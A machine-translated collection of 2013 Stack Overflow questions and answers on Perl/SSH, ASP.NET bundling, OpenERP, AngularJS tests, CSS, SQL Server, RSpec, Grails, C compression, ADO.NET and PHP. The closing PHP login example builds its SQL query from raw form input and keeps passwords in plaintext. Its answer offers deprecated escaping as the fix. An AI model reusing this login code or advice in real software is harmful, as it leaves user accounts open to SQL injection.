> 赞同：1
> 
> 时间：2013-04-01T06:50:55.337
> 
> 标签：perl, environment-variables, remote-access

如何在远程机器上的 perl 中设置环境变量？

我 ssh 进入远程机器，然后尝试通过 export 命令设置环境变量。但它没有设置环境变量

```
`ssh -2A root@x.x.x.x`;
`export someEnv=no`; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T07:10:32.837

```
ssh -2A root@x.x.x.x 'someEnv=no script.pl' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:02:15.960

ssh -2A root@xxxx "export VAR=value && ./script.pl"

# c# - MVC4 中的捆绑

> ID：15738958
> 
> 赞同：-1
> 
> 时间：2013-04-01T06:50:56.270
> 
> 标签：c#, asp.net-mvc-3, bundling-and-minification

在我的 MVC 应用程序中，最初我调用了每个页面中的所有脚本和样式。在看到捆绑概念之后。我在 Bundle.config 页面中引用了脚本和样式。这里的脚本没有在我的页面中引用。我不在我的应用程序中使用布局页面。

**捆绑配置**

```
 bundles.Add(new ScriptBundle("~/bundles/jquery").Include(
                "~/Scripts/jquery-{1.7.1}.js"));

    bundles.Add(new ScriptBundle("~/bundles/jqueryui").Include(
                "~/Scripts/jquery-ui-{1.8.20}.js"));
    bundles.Add(new ScriptBundle("~/bundles/jqueryuc").Include(
                "~/Scripts/jquery.dcmegamenu.1.3.3.js",
                "~/Scripts/jquery.hoverIntent.minified.js"));

    bundles.Add(new ScriptBundle("~/bundles/jqueryuh").Include(
                "~/Scripts/html5.js"));

    bundles.Add(new ScriptBundle("~/bundles/jqueryumin").Include(
                "~/Scripts/jquery.uniform.min.js"));

    bundles.Add(new ScriptBundle("~/bundles/jqueryea").Include(
                "~/Scripts/jquery.easing.1.3.js",
                "~/Scripts/jquery.hoverIntent.minified.js"));

    bundles.Add(new StyleBundle("~/CSS/css").Include(
                "~/CSS/AdminLayStyle.css",
                "~/CSS/tab.css",
                "~/CSS/login.css", 
                "~/CSS/login-box.css",
                "~/CSS/base.css",
                "~/CSS/style_file.css",
                "~/CSS/menustyle.css"));

    bundles.Add(new StyleBundle("~/CSS/Content/themes/base/css").Include("~/CSS/Content/themes/base/jquery-ui.css",
                "~/CSS/Content/themes/base/jquery.ui.all.css",
                "~/CSS/Content/themes/base/jquery.ui.base.css",
                "~/CSS/Content/themes/base/jquery.ui.dialog.css",
                "~/CSS/Content/themes/base/jquery-ui.css", 
                "~/CSS/Content/themes/base/jquery.ui.theme.css")); 
```

并在查看**Index.cshtml**

```
 @Scripts.Render("~/bundles/jquery")
 @Scripts.Render("~/bundles/jqueryui")
 @Scripts.Render("~/bundles/jqueryuc")
 @Styles.Render("~/Content/css") 
```

Bundle.config 中对样式的引用是否正确？
提前致谢。
**编辑：**
是否有任何规则只能从 Content 文件夹中引用所有样式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:53:53.240

Javascripts 看起来不错。CSS是错误的。没有`~/Content/css`定义任何捆绑包。你可能的意思是：

```
@Styles.Render("~/CSS/css") 
```

此外，您可能还想包含 jQuery UI 样式：

```
@Styles.Render("~/CSS/Content/themes/base/css") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-04T05:16:23.760

我得到了它。引用样式和图像的相对路径必须来自 Content 文件夹。

# openerp - 如何设置新的搜索过滤器？

> ID：15738962
> 
> 赞同：3
> 
> 时间：2013-04-01T06:51:25.443
> 
> 标签：openerp

如何在搜索视图中为我的过滤器按钮设置默认值？我尝试为操作设置一个上下文，就像它在合作伙伴模块中的方式一样。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:55:15.153

我在另一个站点上得到了这个解决方案您只能使用在搜索视图中定义的那些字段。

为此，您需要在 context.key 中传递正确的键和值应该像这样

search_default_filter_name

示例：在 res_partner 搜索视图中有一个像这样的过滤器

```
<filter string="Persons" name="type_person" icon="terp-personal" domain="[('is_company','=',0)]"/> 
```

如果您希望将此过滤器作为默认传递上下文，如下所示

```
<field name="context">{"search_default_customer":1,"search_default_type_person":1}</field> 
```

如果您不希望 search_default_customer 使用 {"search_default_type_person":1} 这样的传递状态 {"search_default_customer":0,"search_default_type_person":1}

您还可以使用搜索视图中的字段

```
<field name="parent_id" filter_domain="[('parent_id','child_of',[self])]"/> 
```

使用像这样的字段传递上下文 {"search_default_parent_id":1}

# angularjs - testacular：如何测试 angular.js 指令

> ID：15738964
> 
> 赞同：0
> 
> 时间：2013-04-01T06:51:41.887
> 
> 标签：angularjs, jasmine, karma-runner

我知道如何使用 jasmine 进行测试，但是如何使用 jasmined based `testacular`to test 指令，假设我定义了这样的指令：

```
angular.module('todoList', [], function () {

}).directive('dt', function ($compile) {
    return {
        scope: true,
        template: '<p ng-click="test()">HaHaHa</p>',
        replace: true,
        controller: function ($scope) {
            $scope.test = function () {
                console.warn('click!');
            }
        },
        link: function ($scope, $el, $attr) {
            var checkbox = '<input type="checkbox" >';
            $el.append($compile(checkbox)($scope)); 
        }
    }

}) 
```

如何测试`dt`元素？

我找到了一些教程并尝试以这种方式编写测试：

```
describe('My own function', function(){
    it('should get called on a click', inject(function($rootScope, $compile) {
        element = $compile('<div dt></div>')($rootScope);
        $rootScope.$digest();
        browserTrigger(element, 'click');
    }));
}); 
```

但它不起作用

# javascript - 使用 d3.js 图表填充页面时出现 CSS/对齐问题

> ID：15738965
> 
> 赞同：0
> 
> 时间：2013-04-01T06:51:43.527
> 
> 标签：javascript, html, css, d3.js

我不明白为什么左列（在图像中突出显示）和标题之间有空白。这只发生在我用图表填充中间列时。看着 chrome 开发人员，我不明白我错过了什么。这是代码片段。我尝试在左列图像的底部添加边距和填充，但这没有帮助。我错过了什么？

```
<body style="padding-left: 5px;">
<div id="header" style="width: 960px; height: 100px; background-color: #F5F5F5">
    <p>Bubble Inc</p>
</div>
<div id="container" style="width: 1100px; height: 1000px"">
    <div id="leftCol" style="width: 225px; display: inline-block; margin-bottom: 50px; padding-bottom: 30px;"></div>
    <div id="midCol" style="width: 600px; display: inline-block;"></div>
    <div id="rightCol" style="width: 225px; display: inline-block;"></div>
</div>
<script type="text/javascript"> 
```

![CSS & D3.js](https://i.stack.imgur.com/OtUBo.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T22:23:40.987

问题是大图表会拖小图表，因为您**没有垂直对齐规则**。我在您的代码中添加了一个大占位符图表 (id: `bigContent`) 以显示效果：

```
<style>
    #leftCol  { background-color: red   }
    #rightCol { background-color: green }
    #midCol   { background-color: blue  }
    #bigContent { height: 200px;}
</style>
<div id="header"    style="width: 960px; height: 100px; background-color: yellow"><p>Bubble Inc</p></div>
<div id="container" style="width: 1100px; height: 1000px">
    <div id="leftCol"  style="width: 225px; display: inline-block;">A</div>
    <div id="midCol"   style="width: 600px; display: inline-block;">
        <div id="bigContent">Biiig Content</div>
    </div>
    <div id="rightCol" style="width: 225px; display: inline-block;">C</div>
</div> 
```

您可以通过向该部分添加垂直对齐规则来**解决此问题**`style`。

```
 #container>div { vertical-align: top; } 
```

# sql-server - 使用 UNION 和 Distinct 后 SQL 查询返回重复值

> ID：15738971
> 
> 赞同：0
> 
> 时间：2013-04-01T06:52:15.877
> 
> 标签：sql-server, stored-procedures

我有一个 SQL 查询，我试图在合并两个查询后获得不同的值。我已经在两个查询中使用了 Distinct。

我`RegID`在表中作为主键，`Registration`对于注册表中的每个条目，在即表中都有相应的条目`RoomType`作为`RoomType`外`RegID`键。

`RoomType`现在的问题是，如果表中有多个条目，`RegID`我会得到重复的 Regid。

我的查询打印是这样的：

```
SELECT DISTINCT 
    dbo.tbRegistration.RegID, 
    dbo.tbRegistration.PropertyName, dbo.tbRegistration.IsActive, 
    dbo.tbRegistration.Stars, dbo.tbRegistration.City, 
    dbo.tbRegistration.Address, 
    dbo.tbHotelImages.MainImage, dbo.tbHotelImages.Img1, 
    dbo.tbHotelImages.Img2, dbo.tbHotelImages.Img3, 
    dbo.tbHotelImages.Img4, dbo.tbHotelImages.Img5, 
    dbo.tbHotelImages.Img6, dbo.tbHotelImages.Img7, 
    dbo.tbHotelImages.Img8, dbo.tbHotelImages.Img9, 
    dbo.tbRegistration.PropertyID, 
    dbo.tbHotelFeatures.*, 
    dbo.tbBillingPlan.BaseRate, dbo.tbRoomType.Name as RoomTypeName
FROM         
    dbo.tbRoomType 
LEFT OUTER JOIN
    dbo.tbRegistration ON dbo.tbRoomType.RegID = dbo.tbRegistration.RegID  
LEFT OUTER JOIN
    dbo.tbBillingPlan ON dbo.tbRoomType.RTID = dbo.tbBillingPlan.RTID    
LEFT OUTER JOIN
    dbo.tbHotelFeatures ON dbo.tbRegistration.RegID = dbo.tbHotelFeatures.RegID  
LEFT OUTER JOIN
    dbo.tbHotelImages ON dbo.tbRegistration.RegID = dbo.tbHotelImages.RegID                                          
WHERE 
    tbRegistration.PMS = 0 
    AND tbRegistration.Stars IN (0) OR 1=1 
    AND (tbRegistration.City LIKE '%' + @SearchText + '%')  
    AND (tbRoomType.Adults >= @Adults OR tbRoomType.Children >= @Children)
    AND (dbo.GetFreeRoomType(dbo.tbRoomType.RTID, @CheckIn, @CheckOut) > 0) 
    AND dbo.tbRegistration.IsActive = 1     

UNION

SELECT DISTINCT 
    dbo.tbRegistration.RegID  , dbo.tbRegistration.PropertyName, dbo.tbRegistration.IsActive, dbo.tbRegistration.Stars, dbo.tbRegistration.City, dbo.tbRegistration.Address, 
                      dbo.tbHotelImages.MainImage, dbo.tbHotelImages.Img1, dbo.tbHotelImages.Img2, dbo.tbHotelImages.Img3, dbo.tbHotelImages.Img4, dbo.tbHotelImages.Img5, 
                      dbo.tbHotelImages.Img6, dbo.tbHotelImages.Img7, dbo.tbHotelImages.Img8, dbo.tbHotelImages.Img9, dbo.tbRegistration.PropertyID    , 
                      dbo.tbHotelFeatures.*, dbo.tbBillingPlan.BaseRate,dbo.tbRoomType.Name as RoomTypeName
FROM         dbo.tbRoomType left OUTER JOIN
                      dbo.tbRegistration ON dbo.tbRoomType.RegID = dbo.tbRegistration.RegID  left OUTER JOIN
                      dbo.tbBillingPlan ON dbo.tbRoomType.RTID = dbo.tbBillingPlan.RTID    LEFT OUTER JOIN
                      dbo.tbHotelFeatures ON dbo.tbRegistration.RegID = dbo.tbHotelFeatures.RegID  LEFT OUTER JOIN
                      dbo.tbHotelImages ON dbo.tbRegistration.RegID = dbo.tbHotelImages.RegID                                           
       Where tbRegistration.PMS=1  and   tbRegistration.Stars IN (   0 ) or 1=1 and    (tbRegistration.City like  '%' + @SearchText + '%' )    

and (tbRoomType.Adults>=@Adults  or tbRoomType.Children>=@Children )
 and(dbTestSparrowPMS . dbo.GetFreeRoomType(dbo.tbRoomType.ID, @CheckIn, @CheckOut) >0) and dbo.tbRegistration.IsActive=1

   order by  tbRegistration.RegID 
```

我的程序是这样的：

```
USE [dbTestSearchMyHotel]
GO
/****** Object:  StoredProcedure [dbo].[prRegistrationSearchFreeHotels]    Script Date: 04/01/2013 12:06:26 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
-- =============================================
-- Author:      <Author,,Name>
-- Create date: <Create Date,,>
-- Description: <Description,,>
-- =============================================
ALTER PROCEDURE [dbo].[prRegistrationSearchFreeHotels]   -- 's','4/27/2013','4/28/2013',1,1,0,0,0,0,0,0,0

    -- Add the parameters for the stored procedure here select * from tbRegistration where Stars in(1,4)

@SearchText varchar(4000),
@CheckIn date,
@CheckOut date,
@Adults int,
@Children int,
@Min float,
@Max float,
@OneStar bit,
@TwoStar bit,
@ThreeStar bit,
@FourStar bit,
@FiveStar bit

    AS
     Declare @SQLQuery AS NVarchar(4000)
Declare @ParamDefinition AS NVarchar(4000) 
declare @n as bit
set @n=0
BEGIN
    -- SET NOCOUNT ON added to prevent extra result sets from
    -- interfering with SELECT statements.
    SET NOCOUNT ON;

    -- Insert statements for procedure here

  Set @SQLQuery='SELECT DISTINCT 
                      dbo.tbRegistration.RegID  , dbo.tbRegistration.PropertyName,dbo.tbRegistration.IsActive, dbo.tbRegistration.Stars, dbo.tbRegistration.City, dbo.tbRegistration.Address, 
                      dbo.tbHotelImages.MainImage, dbo.tbHotelImages.Img1, dbo.tbHotelImages.Img2, dbo.tbHotelImages.Img3, dbo.tbHotelImages.Img4, dbo.tbHotelImages.Img5, 
                      dbo.tbHotelImages.Img6, dbo.tbHotelImages.Img7, dbo.tbHotelImages.Img8, dbo.tbHotelImages.Img9, dbo.tbRegistration.PropertyID    , 
                      dbo.tbHotelFeatures.*, dbo.tbBillingPlan.BaseRate,dbo.tbRoomType.Name as RoomTypeName
FROM         dbo.tbRoomType left OUTER JOIN
                      dbo.tbRegistration ON dbo.tbRoomType.RegID = dbo.tbRegistration.RegID  left OUTER JOIN
                      dbo.tbBillingPlan ON dbo.tbRoomType.RTID = dbo.tbBillingPlan.RTID    LEFT OUTER JOIN
                      dbo.tbHotelFeatures ON dbo.tbRegistration.RegID = dbo.tbHotelFeatures.RegID  LEFT OUTER JOIN
                      dbo.tbHotelImages ON dbo.tbRegistration.RegID = dbo.tbHotelImages.RegID                                          
                              Where  tbRegistration.PMS=0 and  tbRegistration.Stars IN (   ' 
     if @OneStar =1 
     begin
    set @n =1
    set @SQLQuery =@SQLQuery +'  1  '
    end

  if @TwoStar =1 
  begin
     if @n =1
     begin
     set @SQLQuery =@SQLQuery +' , 2 '
       end
     else
     begin
     set @n=1
     set @SQLQuery =@SQLQuery +' 2 '
      end
 end

  if @ThreeStar =1 
  begin
     if @n =1
     begin
    set @SQLQuery =@SQLQuery +' , 3 '
    end
    else
     begin
     set @n=1
     set @SQLQuery =@SQLQuery +' 3  '
    end
 end

  if @FourStar =1 
  begin
     if @n =1
     begin
    set @SQLQuery =@SQLQuery +' , 4 '
    end
    else
    begin
     set @n=1
      set @SQLQuery =@SQLQuery +' 4 '
    end
    end

  if @FiveStar =1 
  begin
    if @n =1
     begin
     set @SQLQuery =@SQLQuery +' , 5 '
    end
     else
     begin
     set @n=1
     set @SQLQuery =@SQLQuery +' 5 '
    end
    end                         
   if @n=0
 begin
  set @SQLQuery =@SQLQuery +' 0 ) or 1=1 and '
 end      
 else
 begin                      
 set @SQLQuery =@SQLQuery +' )    and ' 
 end
 set @SQLQuery =@SQLQuery +'    (tbRegistration.City like  ''%'' + @SearchText + ''%'' )  

 and (tbRoomType.Adults>=@Adults  or tbRoomType.Children>=@Children )
 and( dbo.GetFreeRoomType(dbo.tbRoomType.RTID, @CheckIn, @CheckOut) >0) and dbo.tbRegistration.IsActive=1    '  
 if @Min > 0 and @Max > 0   
 set @SQLQuery =@SQLQuery +' and (tbBillingPlan.BaseRate>=@Min) and  (tbBillingPlan.BaseRate<=@Max)  '

  set @SQLQuery =@SQLQuery +' union  '
  set @n=0
Set @SQLQuery=@SQLQuery+'SELECT DISTINCT 
                      dbo.tbRegistration.RegID  , dbo.tbRegistration.PropertyName, dbo.tbRegistration.IsActive, dbo.tbRegistration.Stars, dbo.tbRegistration.City, dbo.tbRegistration.Address, 
                      dbo.tbHotelImages.MainImage, dbo.tbHotelImages.Img1, dbo.tbHotelImages.Img2, dbo.tbHotelImages.Img3, dbo.tbHotelImages.Img4, dbo.tbHotelImages.Img5, 
                      dbo.tbHotelImages.Img6, dbo.tbHotelImages.Img7, dbo.tbHotelImages.Img8, dbo.tbHotelImages.Img9, dbo.tbRegistration.PropertyID    , 
                      dbo.tbHotelFeatures.*, dbo.tbBillingPlan.BaseRate,dbo.tbRoomType.Name as RoomTypeName
FROM         dbo.tbRoomType left OUTER JOIN
                      dbo.tbRegistration ON dbo.tbRoomType.RegID = dbo.tbRegistration.RegID  left OUTER JOIN
                      dbo.tbBillingPlan ON dbo.tbRoomType.RTID = dbo.tbBillingPlan.RTID    LEFT OUTER JOIN
                      dbo.tbHotelFeatures ON dbo.tbRegistration.RegID = dbo.tbHotelFeatures.RegID  LEFT OUTER JOIN
                      dbo.tbHotelImages ON dbo.tbRegistration.RegID = dbo.tbHotelImages.RegID                                           
       Where tbRegistration.PMS=1  and   tbRegistration.Stars IN (  ' 
     if @OneStar =1 
     begin
    set @n =1
 set @SQLQuery =@SQLQuery +'  1  '
 end
     if @TwoStar =1 
     begin
         if @n =1
        begin
        set @SQLQuery =@SQLQuery +', 2 '
        end
        else
        begin
         set @SQLQuery =@SQLQuery +' 2 '
         set @n=1
            end
     end
  if @ThreeStar =1 
  begin
         if @n =1
          begin
        set @SQLQuery =@SQLQuery +' , 3 '
         end
        else
         begin
         set @n=1
        set @SQLQuery =@SQLQuery +' 3'
            end
 end

  if @FourStar =1 
  begin
         if @n =1
         begin
        set @SQLQuery =@SQLQuery +' , 4 '
        end
        else
        begin
        Set @n=1
        set @SQLQuery =@SQLQuery +' 4 '
        end
 end
   if @FiveStar =1 
   begin
         if @n =1
         begin
        set @SQLQuery =@SQLQuery +', 5 '
        end
        else
        begin
        Set @n=1
         set @SQLQuery =@SQLQuery +' 5 '
        end
 end                         
  if @n=0
 begin
  set @SQLQuery =@SQLQuery +' 0 ) or 1=1 and '
 end      
 else
 begin                      
 set @SQLQuery =@SQLQuery +' )    and ' 
 end
 set @SQLQuery =@SQLQuery +'   (tbRegistration.City like  ''%'' + @SearchText + ''%'' )    

and (tbRoomType.Adults>=@Adults  or tbRoomType.Children>=@Children )
 and(dbTestSparrowPMS . dbo.GetFreeRoomType(dbo.tbRoomType.ID, @CheckIn, @CheckOut) >0) and dbo.tbRegistration.IsActive=1

  '  

 if @Min > 0 and @Max > 0   
 set @SQLQuery =@SQLQuery +' and (tbBillingPlan.BaseRate>=@Min) and  (tbBillingPlan.BaseRate<=@Max) '

 set @SQLQuery=@SQLQuery + ' order by  tbRegistration.RegID'
  --

       Set @ParamDefinition = ' 
@SearchText varchar(4000),
@CheckIn date,
@CheckOut date,
@Adults int,
@Children int,
@Min float,
@Max float,
@OneStar bit,
@TwoStar bit,
@ThreeStar bit,
@FourStar bit,
@FiveStar bit'
   --print @SQLQuery           
    /* Execute the Transact-SQL String with all parameter value's 
       Using sp_executesql Command */
    Execute sp_Executesql     @SQLQuery, 
                @ParamDefinition, 

               @SearchText ,
               @CheckIn ,
               @CheckOut ,
               @Adults ,
               @Children ,
               @Min,
               @Max,
               @OneStar ,
               @TwoStar ,
               @ThreeStar ,
               @FourStar ,
               @FiveStar 

    return

  end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:18:07.897

UNION 删除重复记录 (UNION = SELECT DISTINCT)，而 UNION ALL 返回重复记录。请检查[此](http://blog.sqlauthority.com/2009/03/11/sql-server-difference-between-union-vs-union-all-optimal-performance-comparison/)链接。

现在在您的查询中，您正在对查询执行 SELECT DISTINCT 并对其使用 UNION。但是，如果您的两个查询为其中一列返回不同的值，那么您将同时获得它们，并且 UNION 不会删除重复项。

例如

ID 文本

1个

1乙

因此，您要么必须删除具有不同值的列，然后尽可能将重复记录返回给您。或添加过滤掉第一个查询中已选择的记录的条件。

# ruby-on-rails - 如何使用 rspec 检查/测试 json 中的特定字段

> ID：15738979
> 
> 赞同：1
> 
> 时间：2013-04-01T06:53:01.087
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, testing, rspec

这是我的 rspec 代码：-

```
 it "which has max value" do
    get :index, Devise.token_authentication_key => @user.authentication_token, business_id: @business.id, max: '1'
    expect(request.flash[:alert]).to eq(nil)
    expect(response.body).to eq([@location].to_json(LocationFinder::API_PARAMS.merge(:root => false)))
  end 
```

测试结果是——

预期："[{\"address\":\"1120 Milky Way\",\"business_id\":1,\"city\":\"Cupertino]"

```
 got: "[{\"address\":\"1120 Milky Way\",\"business_id\":1,\"city\":\"Cupertino,\"distance\":260.33452958767384,]" 
```

**这里距离是一个额外的字段，我如何检查特定字段，或者如果不可能，如何消除 rspec 未检查的“距离”字段。**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T07:03:39.873

您可以使用以下内容检查各个字段：

```
# get the first entry in the JSON array
json_response = JSON.parse(response.body).first

# compare each field
expect(json_response['address']).to eq(@location.address)
expect(json_response['business_id']).to eq(@location.business_id)
expect(json_response['city']).to eq(@location.city) 
```

当然，您可能需要`@location`根据您的实现来调整您调用的确切方法，但这就是要点。

# grails - Grails插件不能依赖其他grails插件？

> ID：15738982
> 
> 赞同：2
> 
> 时间：2013-04-01T06:53:13.543
> 
> 标签：grails, grails-plugin

我在 Windows 中使用 grails 2.2.1。

我想开发一个依赖于 spring-security-core 插件的插件，所以我将依赖项添加到我的插件的 BuildConfig.groovy 中：

```
plugins {
    compile ':spring-security-core:1.2.7.3'
} 
```

然后在我的 grail 应用程序项目中，我在 BuildConfig.groovy 中指定依赖项：

```
grails.plugin.location."xxxxx" = "../grails-plugins/xxxx" 
```

之后，当我尝试刷新我的 grail 应用程序项目的依赖项时，它总是提示

```
unable to resolve class org.springframework.security.authentication.UsernamePasswordAuthenticationToken 
```

这个类是一个依赖于 spring-security-core 插件的类，我的插件也使用这个类。

这是一个grails错误吗？还是我想念什么？请帮忙，提前谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T02:23:37.340

我在这里测试过。在 Grails 2.2.1 中，您需要设置`legacyResolve`为`true`since

> Grails 2.2 不再使用插件的 BuildConfig 进行依赖解析，只使用 POM 提供的数据

当您设置此项并刷新依赖项时，将出现 Spring Security Core 的安装消息。

# c - C 二进制文件的表示

> ID：15738984
> 
> 赞同：0
> 
> 时间：2013-04-01T06:53:17.587
> 
> 标签：c, linux, compression, binaries

对于家庭作业，我创建了一个简单的压缩/解压缩程序，该程序利用了运行长度编码的幼稚实现。我已经让我的程序正常工作了；压缩和解压缩具有大量字符的任何文本文件（例如程序源）可以完美地工作。作为一个实验，我尝试压缩/解压缩压缩程序本身的二进制文件。这导致文件比原始二进制文件小得多，并且显然无法运行。是什么导致了这种数据丢失？

我的假设是它与二进制文件的表示方式有关，但我无法弄清楚。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T07:03:46.673

可能的问题：

*   您的程序以文本模式打开二进制文件，这会损坏`'\r'`和`'\n'`字节
*   您的程序错误地处理零字节，将它们视为字符串 ( `'\0'`) 的结尾而不是它自己的数据
*   您的程序使用`char`（实际上是`signed char`）数据字节，并且仅适用于非负值，即英文文本的 ASCII 字符，但无法使用可能为负的任意字符/字节值
*   您的程序在某处溢出，仅显示在大文件上
*   你的程序还有其他一些与数据相关的错误

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T07:01:45.340

如果平台是 linux（如问题已标记），则二进制模式和文本模式之间没有区别。所以不应该这样；但即便如此，文件也应该以二进制形式打开。

我怀疑您的问题是程序将 '\0' 字符视为终止符（或其他特殊字符）而不是有效数据。

# c# - 使用存储过程从 DataTable 中插入参数

> ID：15738986
> 
> 赞同：1
> 
> 时间：2013-04-01T06:53:38.350
> 
> 标签：c#, sql, sql-server, stored-procedures

我正在尝试使用具有两个表的存储过程插入数据。第一个表是通过文本框的数据，第二个数据是通过我存储在数据库中并传递以插入的网格。问题是当读取数据表并插入它时说有太多的参数恰好添加到 for 循环中。有什么建议如何作为 SP 处理吗？提前致谢。

代码：

```
try
{
  SqlConnection conn = new SqlConnection();
  conn.ConnectionString = strConnection;
  SqlCommand cmd = new SqlCommand();
  cmd.Connection = conn;
  cmd.CommandTimeout = 120;
  cmd.CommandType = CommandType.StoredProcedure;
  cmd.CommandText = "insFamilyDetails";
  cmd.Parameters.AddWithValue("@strHusbandName", strHusbandName);
  cmd.Parameters.AddWithValue("@strRelation", strRelation);
  ....
  ....
   // Child Details
  for (int i = 0; i < strChildredDetails.Rows.Count; i++)
  {
    cmd.Parameters.AddWithValue("@strChildName", strChildredDetails.Rows[i][0].ToString());
    cmd.Parameters.AddWithValue("@strDOB", strChildredDetails.Rows[i][1]);
    cmd.Parameters.AddWithValue("@strBaptisedon", strChildredDetails.Rows[i][2]);
    cmd.Parameters.AddWithValue("@strFirstComOn", strChildredDetails.Rows[i][3]);
    cmd.Parameters.AddWithValue("@strConfirmedOn", strChildredDetails.Rows[i][4]);
    cmd.Parameters.AddWithValue("@strMarried", "0");
    cmd.Parameters.AddWithValue("@strAlive", "1");
  }
  conn.Open();
  ReturnValue = Convert.ToBoolean(cmd.ExecuteNonQuery());
  conn.Close();
}
catch (Exception e)
{
 DL_LogAppErrors(e.ToString(), System.Reflection.MethodBase.GetCurrentMethod().Name, "Insert Family Details");
 return ReturnValue;
}

return ReturnValue; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:55:43.490

您`command`在循环的每次迭代中添加参数。第一次迭代后，您尝试`parameter`在参数集合中添加相同的名称。您可能需要使用[SqlParameterCollection.Clear](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparametercollection.clear%28v=vs.71%29.aspx)清除每次迭代的参数集合。执行命令后清除参数集合（在循环体中）。

```
conn.Open();
for (int i = 0; i < strChildredDetails.Rows.Count; i++)
{
    cmd.Parameters.AddWithValue("@strChildName", strChildredDetails.Rows[i][0].ToString());
    cmd.Parameters.AddWithValue("@strDOB", strChildredDetails.Rows[i][2]);
    cmd.Parameters.AddWithValue("@strBaptisedon", strChildredDetails.Rows[i][2]);
    cmd.Parameters.AddWithValue("@strFirstComOn", strChildredDetails.Rows[i][3]);
    cmd.Parameters.AddWithValue("@strConfirmedOn", strChildredDetails.Rows[i][4]);
    cmd.Parameters.AddWithValue("@strMarried", "0");
    cmd.Parameters.AddWithValue("@strAlive", "1");
    ReturnValue = Convert.ToBoolean(cmd.ExecuteNonQuery());
    cmd.Parameters.Clear();
}
conn.Close(); 
```

如果要在表中插入许多记录，则可以在 SP 中发送逗号分隔值，然后在 SP 中拆分并插入它们。它将保存数据库调用。这篇[文章](https://stackoverflow.com/questions/14257355/execute-stored-procedure-with-array-like-string-separated-by-comma)将展示你如何做到这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T07:03:37.880

我从代码中假设您将添加到主表和子表中。对于这种情况，您需要将流程分成两部分：

1.  在主表中添加数据
2.  循环添加子数据
    注意：添加新集合前需要清除参数，**或者**不添加新参数，而是更改现有参数的值

**编辑：**使用事务

```
con.Open();
SqlTransaction trans = con.BeginTransaction();

try {
    // Execute the SP here
    // After all SP executed, call the commit method
    trans.Commit();
} catch (Exception ex) {
    // An error happened, rollback
    trans.RollBack();
}
con.Close(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:59:40.847

对于要插入的每一行，您必须调用 ExecuteNonQuery() 函数，即，它应该在 for 循环内，然后在循环结束时清除参数集合。

```
 conn.Open();
// Child Details
  for (int i = 0; i < strChildredDetails.Rows.Count; i++)
  {
   cmd.Parameters.AddWithValue("@strHusbandName", strHusbandName);
   cmd.Parameters.AddWithValue("@strRelation", strRelation);
  ....
  ....
    cmd.Parameters.AddWithValue("@strChildName", strChildredDetails.Rows[i][0].ToString());
    cmd.Parameters.AddWithValue("@strDOB", strChildredDetails.Rows[i][1]);
    cmd.Parameters.AddWithValue("@strBaptisedon", strChildredDetails.Rows[i][2]);
    cmd.Parameters.AddWithValue("@strFirstComOn", strChildredDetails.Rows[i][3]);
    cmd.Parameters.AddWithValue("@strConfirmedOn", strChildredDetails.Rows[i][4]);
    cmd.Parameters.AddWithValue("@strMarried", "0");
    cmd.Parameters.AddWithValue("@strAlive", "1");
  ReturnValue = Convert.ToBoolean(cmd.ExecuteNonQuery());
cmd.Parameters.Clear();

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T07:05:55.523

如前所述，如果要插入网格的记录，则需要在每个循环中都有 ExecuteNonQuery。

如果您使用的是 SQL Server 2008，替代选项是使用表值参数，这将使生活更轻松，您不必为 gridview 的每条记录进行往返。只需传递数据表。

请检查[此](http://blogs.microsoft.co.il/blogs/bursteg/archive/2007/12/02/sql-server-2008-table-valued-parameters.aspx)链接。

**编辑：**

对于 SQL Server 2005，您可能希望使用 XML。请检查[此](http://nilthakkar.blogspot.in/2012/05/how-to-pass-multiple-records-to-stored.html)链接。

```
public string SerializeObject<T>(T Obj)
{
string strxml = string.Empty;
using (StringWriter sw = new StringWriter())
{
    XmlSerializer xs = new XmlSerializer(typeof(T));
    xs.Serialize(sw, Obj);
    strxml = sw.ToString();
}
return strxml;
} 
```

链接包含上述函数，将您的数据表传递给此函数，检查生成的 XML 并在存储过程中为 XML 中的元素使用相同的大小写，因为 XML 区分大小写。

# php - 错误的用户名或密码

> ID：15738993
> 
> 赞同：-2
> 
> 时间：2013-04-01T06:54:20.670
> 
> 标签：php

我无法登录。单击按钮登录时，它显示错误的用户名或密码。数据库是 id、用户名、密码和级别。选择`id`, `username`, `password`,`level`从`login`

```
<?php
ob_start();
$message = "";
if ( isset ($_POST['login']))
  {
   include 'admin/dbconnect.php';
   $username = $_POST['username'];
   $password = $_POST['password'];
   if ($username != "" && $password != "")
   {

    $sql = "SELECT * FROM login WHERE username = '$username' and password = '$password' ";
    $result = mysql_query($sql) ;
    $row = mysql_fetch_array($result, MYSQL_ASSOC);
    if (mysql_num_rows($result) ==1)
    {
        session_start();
        $_SESSION['isLogged_in'] = true;
        $_SESSION['username'] = $row['username'];
        $_SESSION['level'] = $row['level'];
        $message = 'Logged-in successfully';
        }
        else
        {
            $message = 'WRONG USERNAME OR PASSWORD';
        }
    }

    else
    {
        $message = 'PLEASE RE-INPUT YOUR USERNAME AND PASSWORD';
    }
    }

    ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:04:15.963

使用 mysql_escape_string 来防止 sql 注入，如果你有 php 5.5.0 或更高版本，你应该使用 mysqli 之类的东西，因为所有 mysql_ 命令都已弃用。

```
